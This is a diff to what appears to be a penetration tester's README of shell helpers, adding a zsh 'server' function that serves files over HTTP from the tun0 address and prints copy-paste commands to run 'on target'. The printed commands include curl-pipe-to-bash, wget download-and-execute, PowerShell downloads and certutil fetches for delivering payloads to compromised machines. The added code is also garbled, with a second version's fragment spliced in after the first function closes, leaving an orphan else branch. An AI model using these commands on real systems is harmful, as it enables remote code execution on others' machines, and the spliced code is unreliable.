@@ -234,6 +234,115 @@ crack hashes.txt /usr/share/wordlists/custom.txt
 crack md5_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
+```zsh
+server() {
+    local port="${1:-8000}"
+
+    # Get IP address (prefer tun0, fallback to local IP)
+    local ip=$(ip addr show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
+    if [[ -z "$ip" ]]; then
+        ip=$(ip addr show | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | cut -d'/' -f1 | head -n1)
+    fi
+
+    echo "🌐 Starting HTTP server on port $port..."
+    echo "📂 Serving: $(pwd)"
+    echo "🔗 Server URL: http://$ip:$port"
+    echo ""
+    echo "📥 Download commands (copy & paste on target):"
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo ""
+    echo "🔹 Wget (download file):"
+    echo "   wget http://$ip:$port/filename"
+    echo ""
+    echo "🔹 Wget (download & execute):"
+    echo "   wget http://$ip:$port/script.sh -O /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh"
+    echo ""
+    echo "🔹 Curl (download file):"
+    echo "   curl http://$ip:$port/filename -o filename"
+    echo ""
+    echo "🔹 Curl (download & execute):"
+    echo "   curl http://$ip:$port/script.sh | bash"
+    echo ""
+    echo "🔹 Curl (download & execute with pipe to sh):"
+    echo "   curl -s http://$ip:$port/script.sh | sh"
+    echo ""
+    echo "🔹 PowerShell (Windows):"
+    echo "   Invoke-WebRequest -Uri http://$ip:$port/filename -OutFile filename"
+    echo "   iwr -uri http://$ip:$port/filename -o filename"
+    echo ""
+    echo "🔹 Certutil (Windows):"
+    echo "   certutil -urlcache -f http://$ip:$port/filename filename"
+    echo ""
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo ""
+
+    python3 -m http.server "$port"
+}      echo "   wget http://$ip:$port/$filename"
+        echo ""
+        echo "🔹 Wget (download & execute):"
+        echo "   wget http://$ip:$port/$filename -O /tmp/$filename && chmod +x /tmp/$filename && /tmp/$filename"
+        echo ""
+        echo "🔹 Curl (download):"
+        echo "   curl http://$ip:$port/$filename -o $filename"
+        echo ""
+        echo "🔹 Curl (download & execute):"
+        echo "   curl http://$ip:$port/$filename | bash"
+        echo ""
+        echo "🔹 Curl (silent download & execute):"
+        echo "   curl -s http://$ip:$port/$filename | sh"
+        echo ""
+        echo "🔹 PowerShell (Windows):"
+        echo "   Invoke-WebRequest -Uri http://$ip:$port/$filename -OutFile $filename"
+        echo "   iwr -uri http://$ip:$port/$filename -o $filename"
+        echo ""
+        echo "🔹 Certutil (Windows):"
+        echo "   certutil -urlcache -f http://$ip:$port/$filename $filename"
+        echo ""
+    else
+        # Generic commands
+        echo ""
+        echo "📥 Download commands (copy & paste on target):"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo ""
+        echo "🔹 Wget (download file):"
+        echo "   wget http://$ip:$port/filename"
+        echo ""
+        echo "🔹 Wget (download & execute):"
+        echo "   wget http://$ip:$port/script.sh -O /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh"
+        echo ""
+        echo "🔹 Curl (download file):"
+        echo "   curl http://$ip:$port/filename -o filename"
+        echo ""
+        echo "🔹 Curl (download & execute):"
+        echo "   curl http://$ip:$port/script.sh | bash"
+        echo ""
+        echo "🔹 Curl (silent download & execute):"
+        echo "   curl -s http://$ip:$port/script.sh | sh"
+        echo ""
+        echo "🔹 PowerShell (Windows):"
+        echo "   Invoke-WebRequest -Uri http://$ip:$port/filename -OutFile filename"
+        echo "   iwr -uri http://$ip:$port/filename -o filename"
+        echo ""
+        echo "🔹 Certutil (Windows):"
+        echo "   certutil -urlcache -f http://$ip:$port/filename filename"
+        echo ""
+        echo "💡 Tip: Use 'serve <filename>' to get commands for a specific file"
+        echo ""
+    fi
+
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo ""
+
+    python3 -m http.server "$port"
+}
+```
+```bash
+server
+```
+```bash
+server filename
+```
+
 ---
 
 <div align="center">
